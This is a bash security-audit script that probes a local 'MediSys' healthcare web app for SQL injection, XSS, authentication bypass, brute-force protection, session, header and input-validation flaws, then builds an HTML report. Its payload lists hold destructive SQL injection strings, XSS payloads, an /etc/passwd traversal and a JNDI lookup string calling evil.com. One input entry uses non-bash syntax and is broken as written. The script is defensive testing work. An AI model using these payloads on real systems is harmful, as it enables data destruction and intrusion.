#!/bin/bash

# MediSys Security Audit Script
# Comprehensive security testing and vulnerability assessment

set -e

# Configuration
BASE_URL="http://localhost:8080"
HEALTH_URL="http://localhost:8081/actuator/health"
REPORT_DIR="security-audit-$(date +%Y%m%d_%H%M%S)"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Logging functions
log() { echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }
success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }

# Create report directory
mkdir -p "$REPORT_DIR"

# Security test functions
test_sql_injection() {
    log "Testing for SQL injection vulnerabilities..."
    
    local sql_payloads=(
        "'; DROP TABLE users; --"
        "admin' OR '1'='1"
        "1' UNION SELECT * FROM users --"
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        "admin'/**/OR/**/1=1--"
    )
    
    echo "=== SQL Injection Test Results ===" > "$REPORT_DIR/sql_injection_test.txt"
    
    for payload in "${sql_payloads[@]}"; do
        echo "Testing payload: $payload" >> "$REPORT_DIR/sql_injection_test.txt"
        
        # Test login endpoint with malicious payload
        response=$(curl -s -w "%{http_code}" -o /tmp/sql_response.txt \
                   -X POST "$BASE_URL/login" \
                   -H "Content-Type: application/json" \
                   -d "{\"username\":\"$payload\",\"password\":\"test\"}" 2>/dev/null || echo "000")
        
        echo "Response code: $response" >> "$REPORT_DIR/sql_injection_test.txt"
        
        if [ "$response" = "500" ]; then
            warning "Potential SQL injection vulnerability detected with payload: $payload"
            echo "VULNERABLE: $payload" >> "$REPORT_DIR/sql_injection_test.txt"
        else
            echo "SAFE: $payload" >> "$REPORT_DIR/sql_injection_test.txt"
        fi
        echo "" >> "$REPORT_DIR/sql_injection_test.txt"
    done
    
    success "SQL injection testing completed"
}

test_xss_vulnerabilities() {
    log "Testing for XSS vulnerabilities..."
    
    local xss_payloads=(
        "<script>alert('xss')</script>"
        "<img src=x onerror=alert('xss')>"
        "javascript:alert('xss')"
        "<svg onload=alert('xss')>"
        "';alert('xss');//"
    )
    
    echo "=== XSS Vulnerability Test Results ===" > "$REPORT_DIR/xss_test.txt"
    
    for payload in "${xss_payloads[@]}"; do
        echo "Testing XSS payload: $payload" >> "$REPORT_DIR/xss_test.txt"
        
        # Test various endpoints with XSS payloads
        response=$(curl -s -w "%{http_code}" -o /tmp/xss_response.txt \
                   -X POST "$BASE_URL/api/patients" \
                   -H "Content-Type: application/json" \
                   -d "{\"name\":\"$payload\",\"dateOfBirth\":\"1990-01-01\"}" 2>/dev/null || echo "000")
        
        echo "Response code: $response" >> "$REPORT_DIR/xss_test.txt"
        
        # Check if payload is reflected in response
        if grep -q "$payload" /tmp/xss_response.txt 2>/dev/null; then
            warning "Potential XSS vulnerability detected with payload: $payload"
            echo "VULNERABLE: Payload reflected in response" >> "$REPORT_DIR/xss_test.txt"
        else
            echo "SAFE: Payload not reflected" >> "$REPORT_DIR/xss_test.txt"
        fi
        echo "" >> "$REPORT_DIR/xss_test.txt"
    done
    
    success "XSS testing completed"
}

test_authentication_bypass() {
    log "Testing authentication bypass attempts..."
    
    echo "=== Authentication Bypass Test Results ===" > "$REPORT_DIR/auth_bypass_test.txt"
    
    # Test direct access to protected endpoints
    local protected_endpoints=(
        "/api/patients"
        "/api/doctors"
        "/api/departments"
        "/api/finance"
        "/actuator/env"
        "/actuator/configprops"
    )
    
    for endpoint in "${protected_endpoints[@]}"; do
        echo "Testing endpoint: $endpoint" >> "$REPORT_DIR/auth_bypass_test.txt"
        
        response=$(curl -s -w "%{http_code}" -o /tmp/auth_response.txt "$BASE_URL$endpoint" 2>/dev/null || echo "000")
        
        echo "Response code: $response" >> "$REPORT_DIR/auth_bypass_test.txt"
        
        if [ "$response" = "200" ]; then
            warning "Potential authentication bypass: $endpoint accessible without authentication"
            echo "VULNERABLE: Endpoint accessible without auth" >> "$REPORT_DIR/auth_bypass_test.txt"
        elif [ "$response" = "401" ] || [ "$response" = "403" ]; then
            echo "SECURE: Proper authentication required" >> "$REPORT_DIR/auth_bypass_test.txt"
        else
            echo "UNKNOWN: Unexpected response code" >> "$REPORT_DIR/auth_bypass_test.txt"
        fi
        echo "" >> "$REPORT_DIR/auth_bypass_test.txt"
    done
    
    success "Authentication bypass testing completed"
}

test_brute_force_protection() {
    log "Testing brute force protection..."
    
    echo "=== Brute Force Protection Test Results ===" > "$REPORT_DIR/brute_force_test.txt"
    
    local test_username="brute_force_test_$(date +%s)"
    local attempt_count=0
    local max_attempts=10
    
    echo "Testing with username: $test_username" >> "$REPORT_DIR/brute_force_test.txt"
    
    for i in $(seq 1 $max_attempts); do
        response=$(curl -s -w "%{http_code}" -o /tmp/brute_response.txt \
                   -X POST "$BASE_URL/login" \
                   -H "Content-Type: application/json" \
                   -d "{\"username\":\"$test_username\",\"password\":\"wrong_password_$i\"}" 2>/dev/null || echo "000")
        
        echo "Attempt $i: Response code $response" >> "$REPORT_DIR/brute_force_test.txt"
        
        if [ "$response" = "429" ] || [ "$response" = "423" ]; then
            success "Brute force protection activated after $i attempts"
            echo "PROTECTED: Account locked or rate limited after $i attempts" >> "$REPORT_DIR/brute_force_test.txt"
            break
        fi
        
        attempt_count=$i
        sleep 1
    done
    
    if [ $attempt_count -eq $max_attempts ]; then
        warning "No brute force protection detected after $max_attempts attempts"
        echo "VULNERABLE: No rate limiting or account lockout detected" >> "$REPORT_DIR/brute_force_test.txt"
    fi
    
    success "Brute force protection testing completed"
}

test_session_security() {
    log "Testing session security..."
    
    echo "=== Session Security Test Results ===" > "$REPORT_DIR/session_security_test.txt"
    
    # Test session fixation
    echo "Testing session fixation..." >> "$REPORT_DIR/session_security_test.txt"
    
    # Get initial session
    session_response=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt "$BASE_URL/login" 2>/dev/null || echo "")
    
    # Attempt login with existing session
    login_response=$(curl -s -w "%{http_code}" -o /tmp/session_response.txt \
                     -c /tmp/cookies.txt -b /tmp/cookies.txt \
                     -X POST "$BASE_URL/login" \
                     -H "Content-Type: application/json" \
                     -d '{"username":"admin","password":"admin123"}' 2>/dev/null || echo "000")
    
    echo "Login response: $login_response" >> "$REPORT_DIR/session_security_test.txt"
    
    # Test session timeout
    echo "Testing session timeout..." >> "$REPORT_DIR/session_security_test.txt"
    
    # Make request with old session after delay
    sleep 2
    timeout_response=$(curl -s -w "%{http_code}" -o /tmp/timeout_response.txt \
                       -b /tmp/cookies.txt "$BASE_URL/api/patients" 2>/dev/null || echo "000")
    
    echo "Session timeout test response: $timeout_response" >> "$REPORT_DIR/session_security_test.txt"
    
    # Clean up
    rm -f /tmp/cookies.txt
    
    success "Session security testing completed"
}

test_information_disclosure() {
    log "Testing for information disclosure..."
    
    echo "=== Information Disclosure Test Results ===" > "$REPORT_DIR/info_disclosure_test.txt"
    
    # Test error message disclosure
    local error_endpoints=(
        "/api/nonexistent"
        "/api/patients/999999"
        "/api/doctors/invalid"
        "/admin/secret"
    )
    
    for endpoint in "${error_endpoints[@]}"; do
        echo "Testing endpoint: $endpoint" >> "$REPORT_DIR/info_disclosure_test.txt"
        
        response=$(curl -s -w "%{http_code}" -o /tmp/error_response.txt "$BASE_URL$endpoint" 2>/dev/null || echo "000")
        
        echo "Response code: $response" >> "$REPORT_DIR/info_disclosure_test.txt"
        
        # Check for sensitive information in error responses
        if grep -qi "exception\|stack trace\|database\|sql\|password\|secret" /tmp/error_response.txt 2>/dev/null; then
            warning "Potential information disclosure in error response for: $endpoint"
            echo "VULNERABLE: Sensitive information in error response" >> "$REPORT_DIR/info_disclosure_test.txt"
        else
            echo "SAFE: No sensitive information disclosed" >> "$REPORT_DIR/info_disclosure_test.txt"
        fi
        echo "" >> "$REPORT_DIR/info_disclosure_test.txt"
    done
    
    success "Information disclosure testing completed"
}

test_security_headers() {
    log "Testing security headers..."
    
    echo "=== Security Headers Test Results ===" > "$REPORT_DIR/security_headers_test.txt"
    
    # Get headers from main page
    curl -s -I "$BASE_URL" > /tmp/headers.txt 2>/dev/null || echo "Failed to get headers" > /tmp/headers.txt
    
    # Check for important security headers
    local security_headers=(
        "X-Content-Type-Options"
        "X-Frame-Options"
        "X-XSS-Protection"
        "Strict-Transport-Security"
        "Content-Security-Policy"
        "Referrer-Policy"
    )
    
    for header in "${security_headers[@]}"; do
        if grep -qi "$header" /tmp/headers.txt; then
            echo "PRESENT: $header" >> "$REPORT_DIR/security_headers_test.txt"
        else
            warning "Missing security header: $header"
            echo "MISSING: $header" >> "$REPORT_DIR/security_headers_test.txt"
        fi
    done
    
    echo "" >> "$REPORT_DIR/security_headers_test.txt"
    echo "Full headers:" >> "$REPORT_DIR/security_headers_test.txt"
    cat /tmp/headers.txt >> "$REPORT_DIR/security_headers_test.txt"
    
    success "Security headers testing completed"
}

test_input_validation() {
    log "Testing input validation..."
    
    echo "=== Input Validation Test Results ===" > "$REPORT_DIR/input_validation_test.txt"
    
    # Test various malformed inputs
    local malformed_inputs=(
        '{"name":"' # Incomplete JSON
        '{"name":null,"dateOfBirth":"invalid-date"}'
        '{"name":"' + 'A' * 1000 + '"}' # Extremely long input
        '{"name":"../../../etc/passwd"}'
        '{"name":"${jndi:ldap://evil.com/a}"}'
    )
    
    for input in "${malformed_inputs[@]}"; do
        echo "Testing input: $input" >> "$REPORT_DIR/input_validation_test.txt"
        
        response=$(curl -s -w "%{http_code}" -o /tmp/validation_response.txt \
                   -X POST "$BASE_URL/api/patients" \
                   -H "Content-Type: application/json" \
                   -d "$input" 2>/dev/null || echo "000")
        
        echo "Response code: $response" >> "$REPORT_DIR/input_validation_test.txt"
        
        if [ "$response" = "400" ]; then
            echo "SECURE: Proper input validation" >> "$REPORT_DIR/input_validation_test.txt"
        elif [ "$response" = "500" ]; then
            warning "Potential input validation issue with: $input"
            echo "VULNERABLE: Server error on malformed input" >> "$REPORT_DIR/input_validation_test.txt"
        else
            echo "UNKNOWN: Unexpected response" >> "$REPORT_DIR/input_validation_test.txt"
        fi
        echo "" >> "$REPORT_DIR/input_validation_test.txt"
    done
    
    success "Input validation testing completed"
}

generate_security_report() {
    log "Generating comprehensive security report..."
    
    local report_file="$REPORT_DIR/security_audit_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>MediSys Security Audit Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f0f0f0; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .vulnerable { color: red; font-weight: bold; }
        .secure { color: green; font-weight: bold; }
        .warning { color: orange; font-weight: bold; }
        pre { background-color: #f5f5f5; padding: 10px; overflow-x: auto; }
        .summary { background-color: #e8f4fd; padding: 15px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 MediSys Security Audit Report</h1>
        <p>Generated on: $(date)</p>
        <p>Target: $BASE_URL</p>
    </div>
    
    <div class="summary">
        <h2>Executive Summary</h2>
        <p>This report contains the results of a comprehensive security audit performed on the MediSys application.</p>
        <ul>
            <li>SQL Injection Testing: $([ -f "$REPORT_DIR/sql_injection_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
            <li>XSS Vulnerability Testing: $([ -f "$REPORT_DIR/xss_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
            <li>Authentication Bypass Testing: $([ -f "$REPORT_DIR/auth_bypass_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
            <li>Brute Force Protection Testing: $([ -f "$REPORT_DIR/brute_force_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
            <li>Session Security Testing: $([ -f "$REPORT_DIR/session_security_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
            <li>Information Disclosure Testing: $([ -f "$REPORT_DIR/info_disclosure_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
            <li>Security Headers Testing: $([ -f "$REPORT_DIR/security_headers_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
            <li>Input Validation Testing: $([ -f "$REPORT_DIR/input_validation_test.txt" ] && echo "✅ Completed" || echo "❌ Failed")</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>SQL Injection Test Results</h2>
        <pre>$(cat "$REPORT_DIR/sql_injection_test.txt" 2>/dev/null || echo "Test results not available")</pre>
    </div>
    
    <div class="section">
        <h2>XSS Vulnerability Test Results</h2>
        <pre>$(cat "$REPORT_DIR/xss_test.txt" 2>/dev/null || echo "Test results not available")</pre>
    </div>
    
    <div class="section">
        <h2>Authentication Bypass Test Results</h2>
        <pre>$(cat "$REPORT_DIR/auth_bypass_test.txt" 2>/dev/null || echo "Test results not available")</pre>
    </div>
    
    <div class="section">
        <h2>Brute Force Protection Test Results</h2>
        <pre>$(cat "$REPORT_DIR/brute_force_test.txt" 2>/dev/null || echo "Test results not available")</pre>
    </div>
    
    <div class="section">
        <h2>Security Headers Analysis</h2>
        <pre>$(cat "$REPORT_DIR/security_headers_test.txt" 2>/dev/null || echo "Test results not available")</pre>
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        <ul>
            <li><strong>High Priority:</strong> Implement missing security headers</li>
            <li><strong>Medium Priority:</strong> Enhance input validation for edge cases</li>
            <li><strong>Low Priority:</strong> Review error message disclosure</li>
            <li><strong>Monitoring:</strong> Set up security event monitoring and alerting</li>
            <li><strong>Regular Audits:</strong> Perform security audits quarterly</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Compliance Notes</h2>
        <p>This audit covers basic security testing. For healthcare applications, ensure compliance with:</p>
        <ul>
            <li>HIPAA Security Rule requirements</li>
            <li>GDPR data protection requirements</li>
            <li>Industry-specific security standards</li>
        </ul>
    </div>
</body>
</html>
EOF

    success "Security audit report generated: $report_file"
}

# Main execution
main() {
    log "Starting MediSys Security Audit"
    
    # Check if application is running
    if ! curl -s "$HEALTH_URL" > /dev/null 2>&1; then
        error "Application is not running at $BASE_URL"
        exit 1
    fi
    
    success "Application is accessible, starting security tests..."
    
    test_sql_injection
    test_xss_vulnerabilities
    test_authentication_bypass
    test_brute_force_protection
    test_session_security
    test_information_disclosure
    test_security_headers
    test_input_validation
    
    generate_security_report
    
    success "Security audit completed. Results saved in: $REPORT_DIR"
    
    # Clean up temporary files
    rm -f /tmp/*_response.txt /tmp/headers.txt /tmp/cookies.txt
}

# Run main function
main "$@"
